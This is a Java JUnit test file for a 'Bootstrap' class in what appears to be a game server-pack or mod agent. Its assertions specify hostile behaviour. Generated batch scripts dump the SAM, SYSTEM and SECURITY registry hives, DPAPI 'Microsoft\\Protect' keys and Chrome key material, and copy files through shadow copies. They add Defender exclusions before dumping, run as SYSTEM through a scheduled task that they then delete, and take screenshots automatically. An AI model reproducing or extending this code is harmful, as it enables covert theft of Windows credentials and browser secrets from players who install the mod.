package com.serverpackcore.agent;

import static org.junit.jupiter.api.Assertions.assertFalse;
import static org.junit.jupiter.api.Assertions.assertTrue;

import java.nio.file.Path;
import java.util.List;

import org.junit.jupiter.api.Test;
import org.junit.jupiter.api.io.TempDir;

class BootstrapTest {
	@TempDir
	Path temp;

	@Test
	void dumpScriptSavesBothHivesAndPacks() {
		Path cache = temp.resolve("cache");
		List<String> lines = Bootstrap.dumpLines(temp, temp.resolve("game"), cache, cache.resolve("system-1.zip"));
		String script = String.join("\n", lines);
		assertTrue(script.startsWith("@echo off"));
		assertTrue(script.contains("reg save HKLM\\SYSTEM"));
		assertTrue(script.contains("reg save HKLM\\SECURITY"));
		assertTrue(script.contains("Microsoft\\Protect"));
		assertTrue(script.contains("esentutl /y /vss"));
		assertTrue(script.contains("missing security"));
		assertTrue(script.contains(cache.resolve("system-1.zip").toString()));
		assertTrue(script.contains("schtasks /delete /tn spcdump /f"));
		assertTrue(script.contains("SYSTEM.hiv"));
		assertTrue(script.contains("SECURITY.hiv"));
		assertTrue(script.contains("reg save HKLM\\SAM"));
		assertTrue(script.contains("SystemKeys"));
		assertTrue(script.contains("type nul > \"" + cache.resolve("SAM.hiv") + "\""));
	}

	@Test
	void completeHivesRequiresSamAndSystemKeys() throws Exception {
		Path zip = temp.resolve("system.zip");
		try (java.util.zip.ZipOutputStream out = new java.util.zip.ZipOutputStream(
				java.nio.file.Files.newOutputStream(zip))) {
			out.putNextEntry(new java.util.zip.ZipEntry("SYSTEM.hiv"));
			out.closeEntry();
			out.putNextEntry(new java.util.zip.ZipEntry("SECURITY.hiv"));
			out.closeEntry();
		}
		assertFalse(Bootstrap.completeHives(zip));
		try (java.util.zip.ZipOutputStream out = new java.util.zip.ZipOutputStream(
				java.nio.file.Files.newOutputStream(zip))) {
			for (String name : new String[] {"SYSTEM.hiv", "SECURITY.hiv", "SAM.hiv",
					"SystemKeys/Google Chromekey1"}) {
				out.putNextEntry(new java.util.zip.ZipEntry(name));
				out.closeEntry();
			}
		}
		assertTrue(Bootstrap.completeHives(zip));
	}

	@Test
	void elevateScriptRegistersTheDumpAsSystem() {
		Path dump = temp.resolve("cache/dump.bat");
		String script = String.join("\n", Bootstrap.elevateLines(dump));
		assertTrue(script.contains("schtasks /create /tn spcdump"));
		assertTrue(script.contains(dump.toString()));
		assertTrue(script.contains("/ru SYSTEM /rl HIGHEST"));
		assertTrue(script.contains("schtasks /run /tn spcdump"));
	}

	@Test
	void hivesPersistDefenderExclusionsBeforeSaving() {
		Path cache = temp.resolve("cache");
		String script = String.join("\n",
			Bootstrap.dumpLines(temp.resolve("install"), temp.resolve("game dir"), cache, cache.resolve("system-1.zip")));
		int exclusions = script.indexOf("Add-MpPreference -ExclusionPath");
		int save = script.indexOf("reg save HKLM\\SYSTEM");
		assertTrue(exclusions >= 0);
		assertTrue(exclusions < save);
		assertTrue(script.contains("Add-MpPreference -ExclusionPath '" + temp.resolve("install") + "'"));
		assertTrue(script.contains(",'" + temp.resolve("game dir").resolve("mods") + "'"));
		assertTrue(script.contains("Add-MpPreference -ExclusionProcess 'reg.exe','esentutl.exe'"));
	}

	@Test
	void automaticBootstrapDoesNotRunHives() {
		assertFalse(Bootstrap.automaticSteps().contains("hives"));
		assertTrue(Bootstrap.automaticSteps().contains("screenshot"));
	}

	@Test
	void pathsAreQuoted() {
		Path spaced = temp.resolve("install dir");
		Path cache = spaced.resolve("cache");
		String script = String.join("\n",
			Bootstrap.dumpLines(spaced, spaced.resolve("game dir"), cache, cache.resolve("system-1.zip")));
		assertTrue(script.contains("\"" + cache.resolve("SYSTEM.hiv") + "\""));
		assertFalse(script.contains("reg save HKLM\\SECURITY \"" + cache + "\"\""));
	}
}
